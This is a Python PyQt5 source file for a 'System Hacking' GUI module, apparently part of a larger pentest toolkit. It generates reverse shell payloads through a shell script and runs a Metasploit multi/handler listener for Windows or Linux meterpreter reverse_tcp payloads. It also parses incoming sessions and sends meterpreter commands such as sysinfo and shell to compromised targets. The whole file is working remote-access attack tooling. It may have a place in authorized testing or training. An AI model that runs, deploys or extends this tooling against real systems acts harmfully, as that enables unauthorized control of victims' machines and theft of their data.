import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Optional, List, Dict

from PyQt5.QtCore import Qt, QProcess
from PyQt5.QtWidgets import (
    QLabel,
    QVBoxLayout,
    QWidget,
    QGroupBox,
    QPushButton,
    QHBoxLayout,
    QTextBrowser,
    QLineEdit,
    QDialog,
    QDialogButtonBox,
    QFormLayout,
    QComboBox,
    QSpinBox,
    QScrollArea,
    QSizePolicy,
    QListWidget,
    QListWidgetItem,
    QMessageBox,
)

SCRIPT_DIR = Path(__file__).resolve().parent / "scripts"
REPORTS_DIR = Path(__file__).resolve().parents[3] / "reports" / "system_hacking"

# Regex to parse "Meterpreter session 1 opened (1.2.3.4:4444 -> 5.6.7.8:12345) at ..."
SESSION_RE = re.compile(r"[Mm]eterpreter session (\d+) opened \((.+?)\)", re.IGNORECASE)


class PayloadDialog(QDialog):
    """Ask for LHOST, LPORT, and OS for payload generation."""

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)
        self.setWindowTitle("Generate reverse shell payload")
        self.setMinimumWidth(380)
        layout = QVBoxLayout(self)
        form = QFormLayout()
        self.lhost_edit = QLineEdit()
        self.lhost_edit.setPlaceholderText("e.g. 192.168.1.10 or your VPN IP")
        self.lport_spin = QSpinBox()
        self.lport_spin.setRange(1, 65535)
        self.lport_spin.setValue(4444)
        self.os_combo = QComboBox()
        self.os_combo.addItems(["windows", "linux"])
        form.addRow("Listening host IP (LHOST):", self.lhost_edit)
        form.addRow("Listening port (LPORT):", self.lport_spin)
        form.addRow("Payload for OS:", self.os_combo)
        layout.addLayout(form)
        self.error_label = QLabel("")
        self.error_label.setStyleSheet("color: #ff5c64;")
        self.error_label.setWordWrap(True)
        layout.addWidget(self.error_label)
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(self._accept)
        buttons.rejected.connect(self.reject)
        layout.addWidget(buttons)

    def _accept(self) -> None:
        lhost = self.lhost_edit.text().strip()
        if not lhost:
            self.error_label.setText("Enter the listening host IP (your machine's IP).")
            return
        self.error_label.clear()
        self.accept()

    def get_values(self) -> tuple:
        return (
            self.lhost_edit.text().strip(),
            self.lport_spin.value(),
            self.os_combo.currentText().strip().lower(),
        )


class ListenerDialog(QDialog):
    """Ask for LHOST, LPORT, and OS for the listener."""

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)
        self.setWindowTitle("Start listener")
        self.setMinimumWidth(380)
        layout = QVBoxLayout(self)
        form = QFormLayout()
        self.lhost_edit = QLineEdit()
        self.lhost_edit.setPlaceholderText("Same IP as used for payload (LHOST)")
        self.lport_spin = QSpinBox()
        self.lport_spin.setRange(1, 65535)
        self.lport_spin.setValue(4444)
        self.os_combo = QComboBox()
        self.os_combo.addItems(["windows", "linux"])
        form.addRow("Listening host IP (LHOST):", self.lhost_edit)
        form.addRow("Listening port (LPORT):", self.lport_spin)
        form.addRow("Payload type (match payload OS):", self.os_combo)
        layout.addLayout(form)
        self.error_label = QLabel("")
        self.error_label.setStyleSheet("color: #ff5c64;")
        self.error_label.setWordWrap(True)
        layout.addWidget(self.error_label)
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(self._accept)
        buttons.rejected.connect(self.reject)
        layout.addWidget(buttons)

    def _accept(self) -> None:
        lhost = self.lhost_edit.text().strip()
        if not lhost:
            self.error_label.setText("Enter the listening host IP.")
            return
        self.error_label.clear()
        self.accept()

    def get_values(self) -> tuple:
        return (
            self.lhost_edit.text().strip(),
            self.lport_spin.value(),
            self.os_combo.currentText().strip().lower(),
        )


class OpenSessionDialog(QDialog):
    """Ask for session number to open."""

    def __init__(self, sessions: Dict[int, str], parent: QWidget | None = None) -> None:
        super().__init__(parent)
        self.setWindowTitle("Open session")
        self.setMinimumWidth(360)
        layout = QVBoxLayout(self)
        if sessions:
            layout.addWidget(QLabel("Active sessions:"))
            for sid, info in sorted(sessions.items()):
                layout.addWidget(QLabel(f"  Session {sid}: {info}"))
            layout.addWidget(QLabel(""))
        self.session_spin = QSpinBox()
        self.session_spin.setRange(1, 999)
        self.session_spin.setValue(1)
        form = QFormLayout()
        form.addRow("Session number:", self.session_spin)
        layout.addLayout(form)
        self.error_label = QLabel("")
        self.error_label.setStyleSheet("color: #ff5c64;")
        layout.addWidget(self.error_label)
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(self._accept)
        buttons.rejected.connect(self.reject)
        layout.addWidget(buttons)
        self._sessions = sessions

    def _accept(self) -> None:
        self.error_label.clear()
        self.accept()

    def get_session_id(self) -> int:
        return self.session_spin.value()


class SystemHackingModule(QWidget):
    """System Hacking: reverse shell payload and in-app listener with session management."""

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)
        self.scripts_dir = SCRIPT_DIR
        self.listener_process: Optional[QProcess] = None
        self.sessions: Dict[int, str] = {}  # session_id -> "target_info"
        self.active_session: Optional[int] = None  # Currently active session ID
        self._listener_lhost: Optional[str] = None
        self._listener_lport: Optional[int] = None
        self._listener_os: Optional[str] = None
        REPORTS_DIR.mkdir(parents=True, exist_ok=True)

        layout = QVBoxLayout(self)
        layout.setSpacing(12)
        layout.setContentsMargins(12, 12, 12, 12)

        header = QLabel("System Hacking")
        header.setStyleSheet("font-size: 16px; font-weight: bold;")
        layout.addWidget(header)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        scroll.setFrameShape(QScrollArea.NoFrame)
        scroll.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)

        scroll_content = QWidget()
        scroll_layout = QVBoxLayout(scroll_content)
        scroll_layout.setSpacing(16)
        scroll_layout.setContentsMargins(0, 0, 8, 0)
        scroll_layout.addWidget(self._build_reverse_shell_group())
        scroll_layout.addWidget(self._build_listener_group())
        scroll_layout.addWidget(self._build_sessions_group())
        scroll_layout.addStretch()
        scroll.setWidget(scroll_content)
        layout.addWidget(scroll)

        self.output = QTextBrowser()
        self.output.setMinimumHeight(180)
        self.output.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        layout.addWidget(self.output, 1)

        # Command input to send to msfconsole
        cmd_layout = QHBoxLayout()
        cmd_layout.addWidget(QLabel("Command:"))
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Type meterpreter commands (e.g. sysinfo, shell, pwd) and press Enter")
        self.cmd_input.returnPressed.connect(self._send_command)
        cmd_layout.addWidget(self.cmd_input, 1)
        layout.addLayout(cmd_layout)

    def _build_reverse_shell_group(self) -> QGroupBox:
        group = QGroupBox("Reverse shell (msfvenom)")
        group.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        v = QVBoxLayout(group)
        v.setSpacing(8)
        desc = QLabel("Generate a reverse shell payload with msfvenom. Use same LHOST/LPORT for the listener.")
        desc.setWordWrap(True)
        v.addWidget(desc)
        gen_btn = QPushButton("Generate payload…")
        gen_btn.clicked.connect(self._run_generate_payload)
        v.addWidget(gen_btn, alignment=Qt.AlignLeft)
        return group

    def _build_listener_group(self) -> QGroupBox:
        group = QGroupBox("Listener")
        group.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        v = QVBoxLayout(group)
        v.setSpacing(8)
        desc = QLabel("Start the Metasploit handler in-app. Output appears below. Stop when done.")
        desc.setWordWrap(True)
        v.addWidget(desc)
        h = QHBoxLayout()
        self.start_listen_btn = QPushButton("Start listening")
        self.stop_listen_btn = QPushButton("Stop listening")
        self.stop_listen_btn.setEnabled(False)
        self.start_listen_btn.clicked.connect(self._run_start_listener)
        self.stop_listen_btn.clicked.connect(self._run_stop_listener)
        h.addWidget(self.start_listen_btn)
        h.addWidget(self.stop_listen_btn)
        h.addStretch()
        v.addLayout(h)
        return group

    def _build_sessions_group(self) -> QGroupBox:
        group = QGroupBox("Sessions")
        group.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        v = QVBoxLayout(group)
        v.setSpacing(8)
        desc = QLabel("When targets run the payload, sessions appear here. Open a session to interact.")
        desc.setWordWrap(True)
        v.addWidget(desc)
        self.sessions_list = QListWidget()
        self.sessions_list.setMaximumHeight(100)
        v.addWidget(self.sessions_list)
        h2 = QHBoxLayout()
        self.open_session_btn = QPushButton("Open session…")
        self.open_session_btn.clicked.connect(self._run_open_session)
        self.open_session_btn.setEnabled(False)
        self.close_session_btn = QPushButton("Close session")
        self.close_session_btn.clicked.connect(self._run_close_session)
        self.close_session_btn.setEnabled(False)
        h2.addWidget(self.open_session_btn)
        h2.addWidget(self.close_session_btn)
        h2.addStretch()
        v.addLayout(h2)
        self.active_session_label = QLabel("Active session: none")
        self.active_session_label.setStyleSheet("color: #8892a6;")
        v.addWidget(self.active_session_label)
        return group

    def _run_generate_payload(self) -> None:
        dialog = PayloadDialog(self)
        if dialog.exec_() != QDialog.Accepted:
            return
        lhost, lport, os_type = dialog.get_values()
        script = self.scripts_dir / "generate_shell.sh"
        if not script.exists():
            self._append(f"[!] Script not found: {script}")
            return
        self._append(f"[+] Generating {os_type} payload: LHOST={lhost} LPORT={lport}…")
        try:
            res = subprocess.run(
                ["bash", str(script), lhost, str(lport), os_type],
                capture_output=True,
                text=True,
                timeout=120,
                cwd=str(script.parent),
            )
            out = (res.stdout or "").strip()
            err = (res.stderr or "").strip()
            if res.returncode == 0:
                self._append(out or "[+] Payload generated.")
            else:
                self._append(f"[!] generate_shell.sh failed:\n{err or out}")
        except subprocess.TimeoutExpired:
            self._append("[!] Payload generation timed out.")
        except Exception as e:
            self._append(f"[!] Error: {e}")

    def _run_start_listener(self) -> None:
        if self.listener_process and self.listener_process.state() == QProcess.Running:
            self._append("[!] Listener already running.")
            return
        dialog = ListenerDialog(self)
        if dialog.exec_() != QDialog.Accepted:
            return
        lhost, lport, os_type = dialog.get_values()
        payload = "windows/x64/meterpreter/reverse_tcp" if os_type == "windows" else "linux/x64/meterpreter/reverse_tcp"
        msf_exe = shutil.which("msfconsole")
        if not msf_exe:
            for p in ["/usr/share/metasploit-framework/msfconsole", "/opt/metasploit-framework/msfconsole"]:
                if os.path.isfile(p) and os.access(p, os.X_OK):
                    msf_exe = p
                    break
        if not msf_exe:
            self._append("[!] msfconsole not found. Install Metasploit Framework.")
            return
        self._listener_lhost = lhost
        self._listener_lport = lport
        self._listener_os = os_type
        self.sessions.clear()
        self.active_session = None
        self._update_sessions_list()
        msf_x = f"use multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run"
        self.listener_process = QProcess(self)
        self.listener_process.setProcessChannelMode(QProcess.MergedChannels)
        self.listener_process.readyReadStandardOutput.connect(self._on_listener_output)
        self.listener_process.finished.connect(self._on_listener_finished)
        self.listener_process.errorOccurred.connect(self._on_listener_error)
        self.listener_process.start(msf_exe, ["-q", "-x", msf_x])
        if not self.listener_process.waitForStarted(5000):
            self._append("[!] Failed to start msfconsole.")
            self.listener_process = None
            return
        self.start_listen_btn.setEnabled(False)
        self.stop_listen_btn.setEnabled(True)
        self.cmd_input.setEnabled(True)
        self._append(f"[+] Listener started: LHOST={lhost} LPORT={lport} ({os_type}). Run payload on target.")

    def _run_stop_listener(self) -> None:
        if self.listener_process and self.listener_process.state() == QProcess.Running:
            self.listener_process.terminate()
            if not self.listener_process.waitForFinished(3000):
                self.listener_process.kill()
            self._append("[+] Listener stopped.")
        self._reset_listener_ui()

    def _on_listener_output(self) -> None:
        if not self.listener_process:
            return
        data = self.listener_process.readAllStandardOutput().data().decode("utf-8", errors="replace")
        if data:
            self._append(data.rstrip())
            self._parse_sessions_from_output(data)

    def _parse_sessions_from_output(self, text: str) -> None:
        for m in SESSION_RE.finditer(text):
            sid = int(m.group(1))
            info = m.group(2).strip()
            if sid not in self.sessions:
                self.sessions[sid] = info
                self._update_sessions_list()

    def _update_sessions_list(self) -> None:
        self.sessions_list.clear()
        for sid, info in sorted(self.sessions.items()):
            item_text = f"Session {sid}: {info}"
            if sid == self.active_session:
                item_text += " [ACTIVE]"
            self.sessions_list.addItem(QListWidgetItem(item_text))
        self.open_session_btn.setEnabled(len(self.sessions) > 0)
        self._update_active_session_label()
    
    def _update_active_session_label(self) -> None:
        if self.active_session is not None:
            info = self.sessions.get(self.active_session, "unknown")
            self.active_session_label.setText(f"Active session: {self.active_session} ({info})")
            self.active_session_label.setStyleSheet("color: #a9f5d0;")
            self.close_session_btn.setEnabled(True)
        else:
            self.active_session_label.setText("Active session: none")
            self.active_session_label.setStyleSheet("color: #8892a6;")
            self.close_session_btn.setEnabled(False)
    
    def _run_close_session(self) -> None:
        if self.active_session is not None:
            # Exit the session context (go back to msfconsole prompt)
            if self.listener_process and self.listener_process.state() == QProcess.Running:
                self.listener_process.write(b"background\n")
                self.listener_process.waitForBytesWritten(1000)
            self.active_session = None
            self._update_active_session_label()
            self._update_sessions_list()
            self._append("[+] Exited session. Back to msfconsole. Open another session or use msfconsole commands.")

    def _on_listener_finished(self, code: int, status: int) -> None:
        self._reset_listener_ui()
        if code != 0:
            self._append(f"[!] Listener process exited (code={code}, status={status}).")

    def _on_listener_error(self, error: QProcess.ProcessError) -> None:
        self._append(f"[!] Listener error: {error}")

    def _reset_listener_ui(self) -> None:
        self.listener_process = None
        self.active_session = None
        self.start_listen_btn.setEnabled(True)
        self.stop_listen_btn.setEnabled(False)
        self.cmd_input.setEnabled(False)

    def _send_command(self) -> None:
        cmd = self.cmd_input.text().strip()
        if not cmd:
            return
        if not self.listener_process or self.listener_process.state() != QProcess.Running:
            self._append("[!] No listener running. Start the listener first.")
            return
        
        # If no active session, check if it's a msfconsole command (like "sessions", "use", etc.)
        if self.active_session is None:
            # Allow msfconsole commands directly
            if cmd.startswith("sessions") or cmd.startswith("use ") or cmd.startswith("set ") or cmd.startswith("run") or cmd.startswith("back"):
                self.listener_process.write((cmd + "\n").encode())
            else:
                self._append("[!] No active session. Open a session first, or use msfconsole commands (e.g. 'sessions').")
                self.cmd_input.clear()
                return
        else:
            # We're in a session context (entered via sessions -i N)
            # Send command directly - it will go to the active meterpreter session
            # The stty errors are harmless - meterpreter is trying to configure TTY but we don't have one
            self.listener_process.write((cmd + "\n").encode())
            self.listener_process.waitForBytesWritten(1000)
        
        self.cmd_input.clear()

    def _run_open_session(self) -> None:
        if not self.listener_process or self.listener_process.state() != QProcess.Running:
            QMessageBox.warning(self, "No listener", "Start the listener first.")
            return
        dialog = OpenSessionDialog(self.sessions.copy(), self)
        if dialog.exec_() != QDialog.Accepted:
            return
        sid = dialog.get_session_id()
        try:
            # Enter the session context - this puts us "inside" that session
            # Note: stty errors are harmless warnings (meterpreter tries to configure TTY)
            self.active_session = sid
            self.listener_process.write(f"sessions -i {sid}\n".encode())
            self.listener_process.waitForBytesWritten(1000)
            self._update_active_session_label()
            self._update_sessions_list()
            self._append(f"[+] Entered session {sid}. Type commands in the command field (e.g. sysinfo, shell, pwd).")
            self._append("[!] Note: 'stty' errors are harmless - commands will still work.")
        except Exception as e:
            self._append(f"[!] Failed to open session: {e}")
            QMessageBox.warning(self, "Error", str(e))
            self.active_session = None

    def _append(self, text: str) -> None:
        self.output.append(text)
        self.output.ensureCursorVisible()
